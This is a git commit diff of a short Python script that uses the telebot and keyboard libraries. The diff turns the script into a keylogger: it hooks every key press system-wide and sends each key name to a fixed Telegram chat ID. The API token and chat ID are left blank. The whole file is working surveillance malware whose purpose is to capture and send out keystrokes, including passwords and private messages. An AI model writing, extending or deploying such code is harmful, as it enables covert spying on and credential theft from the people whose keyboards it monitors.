ad6e6440e0806b0caca171d6921f0d8078434860
9off <92634754+KriperPlay@users.noreply.github.com>
2024-07-10 00:19:39 +0200

    Update main.py

--- main.py
+++ main.py
@@ -2,17 +2,13 @@ import telebot
 import keyboard
 
 API_TOKEN = ''
+CHAT_ID = 0000000000
 bot = telebot.TeleBot(API_TOKEN)
 
-@bot.message_handler(content_types=['text'])
-def get_messages(message):
-    if message.text == '/check':
-        bot.send_message(message.chat.id, "User online!")
+def on_press(key):
+    bot.send_message(CHAT_ID, f"{key.name}")
 
-    def on_press(key):
-        bot.send_message(message.chat.id, f"{key.name}")
-
-    keyboard.on_press(on_press)
+keyboard.on_press(on_press)
     
 bot.infinity_polling(timeout=30,long_polling_timeout=10)
 keyboard.wait() 
